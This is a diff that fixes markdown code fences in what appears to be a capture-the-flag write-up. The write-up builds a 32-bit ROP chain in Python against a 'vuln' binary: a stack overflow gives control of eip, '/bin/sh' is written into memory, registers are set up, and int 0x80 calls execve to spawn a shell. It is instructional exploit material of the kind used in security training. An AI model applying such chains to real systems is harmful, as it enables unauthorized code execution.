@@ -68,7 +68,8 @@ We open up the binary and yet again find that there is a function named vuln for
 .text:080485B6                      locret_80485B6:                         ; CODE XREF: vuln+4Cj
 .text:080485B6 C9                                   leave
 .text:080485B7 C3                                   retn
-.text:080485B7                      vuln            endp```
+.text:080485B7                      vuln            endp
+```
 
 Pretty straight-forward, get_n gets a string and then atoi converts it to a value.
 
@@ -79,7 +80,8 @@ nptr is 0x30 from the stack buffer so we can get eip control like so:
 ```python
 print '-1'
 # Overflow
-rop = ('A'*0x30)```
+rop = ('A'*0x30)
+```
 
 Now the next value we write will be eip at the end of the function.
 
@@ -87,7 +89,8 @@ Now to build a syscall to execve, first we need "/bin/sh" in memory. So we call 
 
 ```python
 # Call the write thing
-rop += '\xe3\x84\x04\x08' + '\x4e\x86\x04\x08'  + '\x24\xa0\x04\x08' + 'BBBB'```
+rop += '\xe3\x84\x04\x08' + '\x4e\x86\x04\x08'  + '\x24\xa0\x04\x08' + 'BBBB'
+```
 
 Essentially `get_n(0x804a024, 0x42424242);`
 
@@ -98,20 +101,23 @@ Now we need to setup the syscall params.
 ```python
 # Set eax to the proper value, 0xb
 rop += '\x70\x83\x04\x08' + '\xe1\x84\x04\x08' + '\x24\xa0\x04\x08' # eax = 7
-rop += '\xd3\x84\x04\x08'*4 # add 4 to eax```
+rop += '\xd3\x84\x04\x08'*4 # add 4 to eax
+```
 
 Here we print "/bin/sh" which will set `ecx` to 7 and coincidentally `ecx` will also end up being 7.
 
 ```python
 # "/bin/sh", 0 is now at 0x804a024
 # set ebx to that
-rop += '\x76\x86\x04\x08' + '\x24\xa0\x04\x08'```
+rop += '\x76\x86\x04\x08' + '\x24\xa0\x04\x08'
+```
 
 Simply pop the ptr to "/bin/sh" into `ebx`
 
 ```python
 # Ecx = ptr to 0
-rop += '\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08'```
+rop += '\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\xd7\x84\x04\x08'
+```
 
 This probably looks pretty cancer, and it is. This takes `ecx` and increments/doubles it up to be a pointer to zero, this is so that the argv/argc for /bin/sh are valid. (Also I wrote a script to generate this chain rather than me having to hand write it, generation script not included).
 
@@ -119,7 +125,8 @@ This probably looks pretty cancer, and it is. This takes `ecx` and increments/do
 # int 0x80
 rop += '\xd0\x84\x04\x08'
 print rop
-print '/bin/sh\0'```
+print '/bin/sh\0'
+```
 
 And finally call execve to make the shell.
 
@@ -156,4 +163,5 @@ rop += '\xd7\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84\x04\x08\x9a\x84
 rop += '\xd0\x84\x04\x08'
 
 print rop
-print '/bin/sh\0'```
+print '/bin/sh\0'
+```
